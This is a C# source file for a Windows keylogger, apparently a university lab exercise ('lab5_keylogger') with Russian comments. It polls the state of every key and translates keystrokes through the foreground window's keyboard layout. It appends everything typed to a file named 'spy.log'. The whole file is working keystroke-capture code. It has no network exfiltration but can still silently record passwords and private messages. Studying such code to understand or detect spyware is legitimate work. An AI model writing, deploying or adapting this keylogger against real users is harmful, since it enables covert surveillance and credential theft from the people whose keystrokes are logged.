using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace lab5_keylogger
{
    static class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        const uint MAPVK_VK_TO_CHAR = 0x02;

        [STAThread]
        static void Main(String[] args)
        {
            string buf = "";
            while (true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);

                    bool shift = false;
                    short shiftState = (short)GetAsyncKeyState(16);
                    // Keys.ShiftKey не работает, поэтому я подставил его числовой эквивалент
                    if ((shiftState & 0x8000) == 0x8000)
                    {
                        shift = true;
                    }
                    var caps = Console.CapsLock;
                    bool isBig = shift | caps;

                    if ((state & 0x8001) == 0x8001)
                    {
                        if (((Keys)i) == Keys.Space) { buf += " "; continue; }
                        if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }
                        if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.Capital) { continue; }
                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;
                        //if (((Keys)i).ToString().Length == 1)
                        //{
                        //    if (isBig)
                        //        buf += ((Keys)i).ToString();
                        //    else
                        //        buf += ((Keys)i).ToString().ToLowerInvariant();
                        //}
                        //else
                        //{
                        //    buf += $"<{((Keys)i).ToString()}>";
                        //}
                        buf += KeyCodeToUnicode((Keys)i);
                        //buf += $"key {KeyCodeToUnicode((Keys)i)} - state {Convert.ToString(state, 2)}\r\n";
                        var abc = (Keys)i;
                        if (buf.Length > 10)
                        {
                            File.AppendAllText("spy.log", buf);
                            buf = "";
                        }
                    }
                }
            }
        }

        public static string KeyCodeToUnicode(Keys key)
        {
            byte[] keyboardState = new byte[255];
            bool keyboardStateStatus = GetKeyboardState(keyboardState);

            if (!keyboardStateStatus)
            {
                return "";
            }

            uint virtualKeyCode = (uint)key;
            uint scanCode = MapVirtualKey(virtualKeyCode, 0);

            IntPtr hWnd = GetForegroundWindow();
            // Получаем номер потока активного окна
            int WinThreadProcId = GetWindowThreadProcessId(hWnd, out _ProcessId);
            // Получаем раскладку
            IntPtr inputLocaleIdentifier = GetKeyboardLayout(WinThreadProcId);

            StringBuilder result = new StringBuilder();
            ToUnicodeEx(virtualKeyCode, scanCode, keyboardState, result, (int)5, (uint)0, inputLocaleIdentifier);

            return result.ToString();
        }

        [DllImport("user32.dll")]
        static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        static extern uint MapVirtualKey(uint uCode, uint uMapType);

        //[DllImport("user32.dll")]
        //static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        public static string MyCurrentInputLanguage()
        {
            // Gets the current input language  and prints it in a text box.
            InputLanguage myCurrentLanguage = InputLanguage.CurrentInputLanguage;
            return myCurrentLanguage.Culture.EnglishName;
        }




        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetKeyboardLayout(int WindowsThreadProcessID);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int GetWindowThreadProcessId(IntPtr handleWindow, out int lpdwProcessID);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetForegroundWindow();

        private static InputLanguageCollection _InstalledInputLanguages;
        // Идентификатор активного потока
        private static int _ProcessId;
        // Текущий язык ввода
        private static string _CurrentInputLanguage;
        //private static string GetKeyboardLayoutId()
        //{

        //    _InstalledInputLanguages = InputLanguage.InstalledInputLanguages;

        //    // Получаем хендл активного окна
        //    IntPtr hWnd = GetForegroundWindow();
        //    // Получаем номер потока активного окна
        //    int WinThreadProcId = GetWindowThreadProcessId(hWnd, out _ProcessId);

        //    // Получаем раскладку
        //    IntPtr KeybLayout = GetKeyboardLayout(WinThreadProcId);
        //    // Циклом перебираем все установленные языки для проверки идентификатора
        //    for (int i = 0; i < _InstalledInputLanguages.Count; i++)
        //    {
        //        if (KeybLayout == _InstalledInputLanguages[i].Handle)
        //        {
        //            _CurrentInputLanguage = _InstalledInputLanguages[i].Culture.ThreeLetterWindowsLanguageName.ToString();
        //        }
        //    }
        //    return _CurrentInputLanguage;

        //}
    }
}
